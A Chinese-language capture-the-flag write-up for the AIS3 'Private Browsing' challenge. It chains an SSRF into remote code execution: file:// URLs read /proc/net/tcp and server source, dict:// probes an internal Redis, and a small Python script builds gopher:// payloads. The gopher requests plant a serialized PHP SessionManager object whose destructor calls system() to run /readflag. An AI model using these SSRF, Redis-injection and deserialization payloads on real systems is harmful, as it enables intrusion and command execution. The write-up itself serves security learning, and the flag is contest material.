# Private Browsing
## 題目

![image](https://user-images.githubusercontent.com/57281249/168679457-367f5a33-25db-4a3e-8f4e-244d8f1f7746.png)

## 解題
看起來是很經典的 ssrf 雖說前端鎖定 `http[s]` 但後端沒鎖，所以直接用 `/api.php` 做 ssrf。

![image](https://user-images.githubusercontent.com/57281249/168679552-88a04987-7d50-483e-96ff-3c07959cb7ee.png)

先 `http://chals1.ais3.org:8763/api.php?action=view&url=file:///proc/net/tcp` 看有那些機器可以打。

![image](https://user-images.githubusercontent.com/57281249/168679688-0c967c35-cb63-431f-955d-16314138d99f.png)

可以看到 server 頻繁的對 `192.168.224.2:6379` 做存取

![image](https://user-images.githubusercontent.com/57281249/168679788-895144f3-7c15-491a-a442-9a722c921126.png)

google 查到 tcp 6379 port 是 redis

`http://chals1.ais3.org:8763/api.php?action=view&url=dict://192.168.224.2:6379/info` 證實了是 redis。

![image](https://user-images.githubusercontent.com/57281249/168679873-1df967d9-9962-4c41-99e1-9482f9ebd724.png)

但資訊依然不夠，因此抓 source code  `http://chals1.ais3.org:8763/api.php?action=view&url=file:///var/www/html/api.php`

![image](https://user-images.githubusercontent.com/57281249/168679976-11321211-7ae7-4d26-81b0-c9f9d53d475e.png)

有一個 `require_once 'session.php'` 把他抓下來 `http://chals1.ais3.org:8763/api.php?action=view&url=file:///var/www/html/session.php`

![image](https://user-images.githubusercontent.com/57281249/168680029-3bd44063-68a1-47d3-8907-96a9e6adc53f.png)

經過長時間的閱讀後可以發現他會將 cookie `sess_id` 作為 key，現在所用的 `BrowsingSession` class serialize 後儲存到 redis 格式是長這樣 `O:15:"BrowsingSession":1:{s:7:"history";a:1:{i:0;s:19:"https://google.com/";}}` 這就是他做 history 的方式。

![image](https://user-images.githubusercontent.com/57281249/168680103-d9a97b08-e658-4fa6-8ffb-91ba0c8a9c97.png)

![image](https://user-images.githubusercontent.com/57281249/168680292-7ac1febd-13a0-48a6-b4ca-a9aead5ff853.png)

這樣的話就可以用這隻 script 建立 payload (dict 的話冒號會不見)
``` python
from urllib.parse import quote
import sys

tcp_payload = sys.argv[2]
ip = sys.argv[1]
url = f"gopher://{ip}:6379/_{quote(tcp_payload)}"
print(url)
```

但是 `BrowsingSession` 並沒有可以利用這點做 RCE 的地方，因為他只有一個 `history` 的 variable 並作為 array 做存取。

發現 `SessionManager` 的 `encode` 跟 `decode` 是 variable function 執行位置是在 `get()` 跟 `__destruct()`(解構子)

原本是著利用 `get()` 做 RCE 因為外層的 `SessionManager` 再跑 `$session->push` 會用 `__call()` return 的 class 去執行 `push` 
而 `get()` 的內容是 `val` 有東西就直接 return，redis 內有東西就直接 decode redis 的 value，都沒就建一個，而存在 redis 的東西被使用 `gopher://192.168.224.2:6379/_SET%20fc57bda95a5184e55555%20%22O%3A14%3A%5C%22SessionManager%5C%22%3A3%3A%5C%7Bs%3A3%3A%5C%22val%5C%22%3BN%3Bs%3A6%3A%5C%22decode%5C%22%3Bs%3A6%3A%5C%22system%5C%22%3Bs%3A6%3A%5C%22sessid%5C%22%3Bs%3A4%3A%5C%22code%5C%22%3B%5C%7D%22` 改成 `O:14:"SessionManager":3:{s:3:"val";N;s:6:"decode";s:6:"system";s:6:"sessid";s:4:"code";}`
所以他會跑內部的 `SessionManager` 的 `__call()` 然後 call `get()` 因為 `val` 是 null 所以會找 redis，因 redis 的 value 有用 `dict://192.168.224.2:6379/SET%20code%20%22ls%22` 設 `code` 為 `ls` 的 command 且 `decode` 被改成 `system` 所以會 RCE。

![image](https://user-images.githubusercontent.com/57281249/168680691-80edc434-15b8-452f-815a-b385a0cfe275.png)

![image](https://user-images.githubusercontent.com/57281249/168680802-cd723fc9-fa33-428e-9926-862e7438dc30.png)

然而忽略了一點是 `get()` 內的 redis 是 `$this` 下面的而非 `global` 而 connect 後的 redis 無法用 `unserialize` 製造，所以用 `get()` RCE 會是失敗的。

![image](https://user-images.githubusercontent.com/57281249/168680978-db80ee91-3815-4818-b47d-df422484bcb4.png)

後來想到如果成是 error 內部的 `SessionManager` 也會做 `__destruct()` 因此用 `gopher://192.168.224.2:6379/_SET%20fc57bda95a5184e55555%20%22O%3A14%3A%5C%22SessionManager%5C%22%3A3%3A%5C%7Bs%3A3%3A%5C%22val%5C%22%3Bs%3A2%3A%5C%22ls%5C%22%3Bs%3A6%3A%5C%22encode%5C%22%3Bs%3A6%3A%5C%22system%5C%22%3Bs%3A6%3A%5C%22sessid%5C%22%3Bs%3A4%3A%5C%22code%5C%22%3B%5C%7D%22` 將其設為 `O:14:"SessionManager":3:{s:3:"val";s:2:"ls";s:6:"encode";s:6:"system";s:6:"sessid";s:4:"code";}` 

![image](https://user-images.githubusercontent.com/57281249/168681047-d59c3bac-65ee-43ae-a00c-e00e616549f1.png)

然後將 cookie 切為 `fc57bda95a5184e55555` 然後隨便看一個 url 可以發現成功 RCE。

![image](https://user-images.githubusercontent.com/57281249/168681126-6a23d53c-493c-49c6-96fe-7edfe8cd9145.png)

用`gopher://192.168.224.2:6379/_SET%20fc57bda95a5184e55555%20%22O%3A14%3A%5C%22SessionManager%5C%22%3A3%3A%5C%7Bs%3A3%3A%5C%22val%5C%22%3Bs%3A9%3A%5C%22/readflag%5C%22%3Bs%3A6%3A%5C%22encode%5C%22%3Bs%3A6%3A%5C%22system%5C%22%3Bs%3A6%3A%5C%22sessid%5C%22%3Bs%3A4%3A%5C%22code%5C%22%3B%5C%7D%22` 將其設為 `O:14:"SessionManager":3:{s:3:"val";s:9:"/readflag";s:6:"encode";s:6:"system";s:6:"sessid";s:4:"code";}` 

![image](https://user-images.githubusercontent.com/57281249/168681275-3db45eb8-68a1-466d-bd64-dc5569362920.png)

然後將 cookie 切為 `fc57bda95a5184e55555` 便可以看到 flag。

![image](https://user-images.githubusercontent.com/57281249/168681316-972fd3c8-472d-461f-add3-a50a971d0dc0.png)

## Flag
`AIS3{deadly_ssrf_to_rce}`
